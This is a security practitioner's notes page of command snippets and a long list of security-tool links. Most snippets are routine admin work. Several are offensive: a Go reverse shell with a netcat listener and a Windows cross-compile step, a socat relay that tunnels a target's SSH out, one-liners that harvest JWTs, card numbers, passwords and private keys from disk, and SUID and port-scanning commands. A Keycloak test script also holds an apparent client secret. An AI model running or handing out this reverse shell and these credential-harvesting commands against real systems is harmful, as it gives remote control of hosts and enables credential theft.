---
layout: pagetoc
title: /dev/random
permalink: /dev/random/
---
{:toc}

# Snippets

## Socat SSH relay

* Relay

```
while true;do socat -vv TCP4-LISTEN:1234 TCP4-LISTEN:4200;sleep 135;done
```

* Target

```
while true;do socat -v TCP4:<IP OF THE RELAY>:1234 TCP4:localhost:22;sleep 140;done
```

* Ssh to the target

```
ssh -p 4200 targetuser@relay
```

## Get your public IP with nslookup

```sh
nslookup myip.opendns.com. resolver1.opendns.com
```

## Write to syslog with logger command

* Localhost

```sh
logger -p auth.crit 'su[3526]: FAILED su for root by USER1'
```

* UDP

```sh
logger -P 5515 -n 127.0.0.1 -p user.info 'hello from logger'
```

* TCP

```sh
logger -T -P 5515 -n 127.0.0.1 -p user.info 'hello from logger'
```

## Nmap XML report to HTML

```sh
nmap -sn -oA result 127.0.0.1
xsltproc result.xml -o result.html
```

## Parse snort CSV logs (pfsense package default format)

```python
import csv
import json
"""
alert timestamp,sig_generator,sig_id,sig_rev,msg,proto,src,srcport,dst,dstport,id,classification,priority,action,disposition 10000K
"""

with open('/var/log/snort/snort_igb2.1063431/alert') as f:
    for row in f.readlines():
         arow = row.split(',')
         alert = {}
         alert['timestamp'] = arow[0]
         alert['sig_generator'] = arow[1]
         alert['sig_id'] = arow[2]
         alert['sig_rev'] = arow[3]
         alert['msg'] = arow[4]
         alert['proto'] = arow[5]
         alert['src'] = arow[6]
         alert['srcport'] = arow[7]
         alert['dst'] = arow[8]
         alert['dstport'] = arow[9]
         alert['id'] = arow[10]
         alert['classification'] = arow[11]
         alert['priority'] = arow[12]
         alert['action'] = arow[13]
         alert['disposition'] = arow[14].replace('\n', '')
         print(json.dumps(alert))
```

## Golang Reverse Shell

Simple golang reverse shell. 
Setup attacker's IP and TCP port to `net.Dial("tcp", "<ip>:<port>")`.

```go
package main

import (
   "fmt"
   "bufio"
   "net"
   "os/exec"
   "strings"
)

func main() {
   conn, _ := net.Dial("tcp", "127.0.0.1:4443")
   for {

      msg, _ := bufio.NewReader(conn).ReadString('\n')

      out, err := exec.Command(strings.TrimSuffix(msg, "\n")).Output()

      if err != nil {
         return
      }

      fmt.Fprintf(conn, "%s\n",out)

   }
}

```

* compile: `env GOOS=windows GOARCH=386 go build hello.go`
* Attacker's machine: `nc -v -l -p 4443`

Source: [https://medium.com/@sathish__kumar/undetectable-reverse-shell-with-golang-4fd4b1e172c1](https://medium.com/@sathish__kumar/undetectable-reverse-shell-with-golang-4fd4b1e172c1)

## Keycloak device auth test

```python

import time
import requests
import json
import sys
data = {"client_id": "xxxx", "client_secret": "xxxxx"}
headers = {"Content-Type": "application/x-www-form-urlencoded"}
r = requests.post("http://127.0.0.1:8081/auth/realms/test/protocol/openid-connect/auth/device", data=data, headers=headers)
if r.status_code != 200:
    print(r.text)
    sys.exit(1)
rdata = json.loads(r.text)
device_code = rdata['device_code']
user_code = rdata['user_code']
verification_uri = rdata['verification_uri_complete']
print("Go to address {} and give code {}".format(verification_uri, user_code))
poll_data = {"client_id": "xxxx", "client_secret": "26ef7e5d-54cd-4570-a8d9-62687ed21d72", "grant_type": "urn:ietf:params:oauth:grant-type:device_code", "device_code": device_code}
while True:
    r = json.loads(requests.post("http://127.0.0.1:8081/auth/realms/test/protocol/openid-connect/token", data=poll_data, headers=headers).text)
    if "error" in r and r['error'] == "authorization_pending":
        time.sleep(5)
    elif "access_token" in r:
        print("Access token: {}".format(r['access_token']))
        break
```

## Read Ansible vault file with Python

`pip3 install ansible_vault`

```python
from ansible_vault import Vault
import argparse
import getpass

parser = argparse.ArgumentParser(description='Decrypt vault')
parser.add_argument('--vault-file', type=str, help='Path to vault file', required=True)
parser.add_argument('--vault-pass-file', type=str, help='Path to vault password file', required=False)
args = parser.parse_args()
if not args.vault_pass_file:
    pw = getpass.getpass()
else:
    with open(args.vault_pass_file) as f:
        pw = f.read().replace('\n', '')
print(pw)
vault = Vault(pw)
data = vault.load(open(args.vault_file).read())
print(data)
```

* Read using password:

`python3 test.py --vault-file foo.yml`

* Read using password file:

`python3 test.py --vault-file foo.yml --vault-pass-file pwf`

Ansible core lib alternative:

```python
from ansible.constants import DEFAULT_VAULT_ID_MATCH
from ansible.parsing.vault import VaultLib
from ansible.parsing.vault import VaultSecret
import argparse
import getpass
import yaml

parser = argparse.ArgumentParser(description='Decrypt vault')
parser.add_argument('--vault-file', type=str, help='Path to vault file', required=True)
parser.add_argument('--vault-pass-file', type=str, help='Path to vault password file', required=False)
args = parser.parse_args()
if not args.vault_pass_file:
    pw = getpass.getpass()
else:
    with open(args.vault_pass_file) as f:
        pw = f.read().replace('\n', '')

vault = VaultLib([(DEFAULT_VAULT_ID_MATCH, VaultSecret(pw.encode('utf-8')))])
data = yaml.safe_load(vault.decrypt(open(args.vault_file).read()).decode('utf-8'))
print(data)
```

## Grep interesting things from filesystem

### JWT tokens

```sh
grep --color -rP 'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+\/=]*' /var/log
```

### Credit card numbers

```sh
grep --color -Pr '^(?:4[0-9]{12}(?:[0-9]{3})?|(?:5[1-5][0-9]{2}|222[1-9]|22[3-9][0-9]|2[3-6][0-9]{2}|27[01][0-9]|2720)[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})$' /var/log/
```

### Passwords

```sh
grep --color -Pr '(P|p)assword(\s?)[:=](\s?)+[^\s]+' /var/log/
```

### Private keys

```sh
# Search for files that contain 'BEGIN.*PRIVATE' and use awk to extract key(s)
grep -Prl 'BEGIN [A-Z]+ PRIVATE' / 2>/dev/null | xargs -I {} sh -c 'echo "$1:\n$(awk "/BEGIN.*PRIVATE/{a=1}/END.*PRIVATE/{print;a=0}a" $1)"' sh {}
```

## Netcat

### Unix sockets

* Server

```sh
touch /tmp/socket1 && nc -v -l -U /tmp/socket1
```

* Client

```sh
nc -v -U /tmp/socket1
```

### Port scan

```sh
# nc -v target -z port-range 2>&1|grep succeeded
nc -v localhost -z 1000-1234 2>&1|grep succeeded
# Simple scan to search for open TCP port 22 in /24 segment
for i in $(seq 1 254); do nc -w 1 -n -v 10.10.5.$i -z 22 2>&1| grep succeeded;done
```

## Find files with interesting permissions

```sh
# World writable files
find / -perm -o+w -type f 2>/dev/null -not -path "/proc/*" -not -path "/sys/*"
# World writable directories
find / -perm -o+w -type d 2>/dev/null -not -path "/dev/shm" -not -path "/tmp"
# Files with SUID
find / -perm /4000 2>/dev/null
# Files with SGID
find . -perm /2000 2>/dev/null
```

## Send ARP request with Scapy

```python
from scapy.all import * 

ether=Ether()
arp=ARP()
ether.dst='ff:ff:ff:ff:ff:ff'
dst=input('enter destination IP:')
iface=input('enter interface:')

arp.pdst=dst
sendp(ether/arp, iface=iface)
print("Sniffing for responses... wait a moment...")
pkts = sniff(timeout=5, filter='arp')
print(pkts.res,)
```

---

# Links

## Payloads/Exploits

* [https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [https://www.exploit-db.com/](https://www.exploit-db.com/)
* [https://www.metasploit.com/](https://www.metasploit.com/)

## Fuzzing

* [https://github.com/fuzzdb-project/fuzzdb](https://github.com/fuzzdb-project/fuzzdb)
* [https://gitlab.com/akihe/radamsa](https://gitlab.com/akihe/radamsa)

## Web application testing

* [https://portswigger.net/burp](https://portswigger.net/burp)
* [https://www.zaproxy.org/](https://www.zaproxy.org/)
* [https://github.com/sullo/nikto](https://github.com/sullo/nikto)
* [https://owasp.org/www-project-top-ten/](https://owasp.org/www-project-top-ten/)
* [https://owasp.org/www-project-application-security-verification-standard/](https://owasp.org/www-project-application-security-verification-standard/)
* [https://www.appsecmonkey.com/](https://www.appsecmonkey.com/)
* [https://github.com/enaqx/awesome-pentest](https://github.com/enaqx/awesome-pentest)

## Vulnerability scanning

* [https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)
* [https://www.openvas.org/](https://www.openvas.org/)


## SSL/TLS

* [https://github.com/rbsec/sslscan](https://github.com/rbsec/sslscan)
* [https://ssl-config.mozilla.org/](https://ssl-config.mozilla.org/)

## Network scanning

* [https://nmap.org/](https://nmap.org/)
* [https://man.archlinux.org/man/arping.8.en](https://man.archlinux.org/man/arping.8.en)
* [https://www.kali.org/tools/netdiscover/](https://www.kali.org/tools/netdiscover/)
* [https://en.m.wikipedia.org/wiki/Netcat](https://en.m.wikipedia.org/wiki/Netcat)

## Code analysis

* [https://github.com/floyd-fuh/crass](https://github.com/floyd-fuh/crass)
* [https://semgrep.dev/](https://semgrep.dev/)
* [https://www.sonarqube.org/](https://www.sonarqube.org/)

## Malware analysis

* [https://github.com/cuckoosandbox](https://github.com/cuckoosandbox)

## Memory analysis

* [https://accessdata.com/product-download/ftk-imager-version-4-2-0](https://accessdata.com/product-download/ftk-imager-version-4-2-0)
* [https://github.com/504ensicsLabs/LiME](https://github.com/504ensicsLabs/LiME)
* [https://github.com/volatilityfoundation/volatility](https://github.com/volatilityfoundation/volatility)

## OS Security

* [https://www.cisecurity.org/cis-benchmarks/](https://www.cisecurity.org/cis-benchmarks/)
* [https://www.stigviewer.com/stigs](https://www.stigviewer.com/stigs)

### Linux

* [https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project](https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project)
* [https://grsecurity.net/](https://grsecurity.net/)

#### Audit tools

* [https://cisofy.com/lynis/](https://cisofy.com/lynis/)
* [https://www.nongnu.org/tiger/](https://www.nongnu.org/tiger/)

#### Disk encryption

* [https://en.m.wikipedia.org/wiki/Linux_Unified_Key_Setup](https://en.m.wikipedia.org/wiki/Linux_Unified_Key_Setup)
* [https://github.com/latchset/clevis](https://github.com/latchset/clevis)
* [https://www.freedesktop.org/software/systemd/man/systemd-cryptenroll.html](https://www.freedesktop.org/software/systemd/man/systemd-cryptenroll.html)

#### Auditd

* [https://github.com/Neo23x0/auditd](https://github.com/Neo23x0/auditd)
* [https://www.redhat.com/sysadmin/configure-linux-auditing-auditd](https://www.redhat.com/sysadmin/configure-linux-auditing-auditd)
* [https://documentation.suse.com/sles/12-SP4/html/SLES-all/cha-audit-setup.html](https://documentation.suse.com/sles/12-SP4/html/SLES-all/cha-audit-setup.html)

#### Apparmor

* [https://gitlab.com/apparmor](https://gitlab.com/apparmor)
* [https://documentation.suse.com/sles/12-SP4/html/SLES-all/cha-apparmor-intro.html](https://documentation.suse.com/sles/12-SP4/html/SLES-all/cha-apparmor-intro.html)
* [pam_apparmor](https://gitlab.com/apparmor/apparmor/-/wikis/pam_apparmor)

#### IMA

* [https://www.redhat.com/en/blog/how-use-linux-kernels-integrity-measurement-architecture](https://www.redhat.com/en/blog/how-use-linux-kernels-integrity-measurement-architecture)
* [https://wiki.gentoo.org/wiki/Integrity_Measurement_Architecture](https://wiki.gentoo.org/wiki/Integrity_Measurement_Architecture)
* [https://sourceforge.net/p/linux-ima/wiki/Home/](https://sourceforge.net/p/linux-ima/wiki/Home/)
* [https://en.opensuse.org/SDB:Ima_evm](https://en.opensuse.org/SDB:Ima_evm)

### Windows

* [windows-security-baselines](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-security-configuration-framework/windows-security-baselines)
* [Sysinternals](https://learn.microsoft.com/en-us/sysinternals/)

#### Active Directory

* [best-practices-for-securing-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory)
* [https://bloodhound.readthedocs.io/en/latest/index.html](https://bloodhound.readthedocs.io/en/latest/index.html)
* [https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer](https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer)

## News and Blogs

* [https://news.ycombinator.com/](https://news.ycombinator.com/)
* [https://arstechnica.com/](https://arstechnica.com/)
* [https://krebsonsecurity.com/](https://krebsonsecurity.com/)
* [https://www.darkoperator.com/](https://www.darkoperator.com/)

## DevOps / SecDevOps

### Books

* [https://www.amazon.com/DevOps-Handbook-World-Class-Reliability-Organizations/dp/1950508404](https://www.amazon.com/DevOps-Handbook-World-Class-Reliability-Organizations/dp/1950508404)
* [https://www.amazon.com/Unicorn-Project-Developers-Disruption-Thriving-ebook/dp/B07QT9QR41](https://www.amazon.com/Unicorn-Project-Developers-Disruption-Thriving-ebook/dp/B07QT9QR41)
* [https://www.amazon.com/Phoenix-Project-DevOps-Helping-Business/dp/0988262592](https://www.amazon.com/Phoenix-Project-DevOps-Helping-Business/dp/0988262592)

### Testing frameworks

* [https://robotframework.org/](https://robotframework.org/)
* [https://docs.pytest.org/en/7.2.x/](https://docs.pytest.org/en/7.2.x/)
* [https://github.com/ansible-community/pytest-ansible](https://github.com/ansible-community/pytest-ansible)

### CI/CD pipelines

* [Jenkins](https://www.jenkins.io/)

## Random

* [https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project](https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project)
* [https://grsecurity.net/](https://grsecurity.net/)
* [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)

## Ansible

* [https://galaxy.ansible.com/fedora/linux_system_roles](https://galaxy.ansible.com/fedora/linux_system_roles)
* [https://github.com/dev-sec/ansible-collection-hardening](https://github.com/dev-sec/ansible-collection-hardening)

## Vulnerability management

* [https://security-tracker.debian.org/tracker/](https://security-tracker.debian.org/tracker/)

## Password cracking

* [https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)
* [https://www.openwall.com/john/](https://www.openwall.com/john/)
* [https://www.kali.org/tools/crunch/](https://www.kali.org/tools/crunch/)
* [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)


## SOC/SIEM/BlueTeam

* [https://detectionlab.network/](https://detectionlab.network/)
* [https://www.elastic.co/security](https://www.elastic.co/security)
* [https://github.com/activecm/rita](https://github.com/activecm/rita)
* [http://thehive-project.org/](http://thehive-project.org/)
* [http://simple-evcorr.github.io/](http://simple-evcorr.github.io/)
  * [arstechnica - Monitoring with Simple Event Correlator](https://arstechnica.com/information-technology/2005/05/linux-20050519/amp/)
* [https://www.misp-project.org/](https://www.misp-project.org/)

## ModSecurity

* [https://github.com/SpiderLabs/ModSecurity](https://github.com/SpiderLabs/ModSecurity)
* [https://owasp.org/www-project-modsecurity-core-rule-set/](https://owasp.org/www-project-modsecurity-core-rule-set/)
* [https://www.feistyduck.com/library/modsecurity-handbook-free/online/ch01-introduction.html](https://www.feistyduck.com/library/modsecurity-handbook-free/online/ch01-introduction.html)


## HIDS/IDS/IDP

* [https://www.snort.org/](https://www.snort.org/)
* [https://suricata.io/](https://suricata.io/)
* [https://www.ossec.net/](https://www.ossec.net/)
* [https://aide.github.io/](https://aide.github.io/)
* [https://falco.org/](https://falco.org/)


## Traffic analysis

* [https://zeek.org/](https://zeek.org/)
* [https://www.wireshark.org/](https://www.wireshark.org/)
* [https://www.tcpdump.org/](https://www.tcpdump.org/)
* [tshark](https://www.wireshark.org/docs/man-pages/tshark.html)
* [https://scapy.net/](https://scapy.net/)

## CTFs / Wargames / Learning platforms

* [https://overthewire.org/wargames/](https://overthewire.org/wargames/)
* [https://www.hackthebox.com/](https://www.hackthebox.com/)
* [https://www.cybrary.it/](https://www.cybrary.it/course/offensive-penetration-testing/)
* [https://www.virtualhackinglabs.com](https://www.virtualhackinglabs.com)

## Mobile

* [OWASP Mobile Application Security](https://owasp.org/www-project-mobile-app-security/#)

### Android

* [Drozer](https://github.com/WithSecureLabs/drozer)

## Home automation

* [https://www.home-assistant.io/getting-started/](https://www.home-assistant.io/getting-started/)
* [https://nodered.org/](https://nodered.org/)
* [https://ruuvi.com/](https://ruuvi.com/)

---
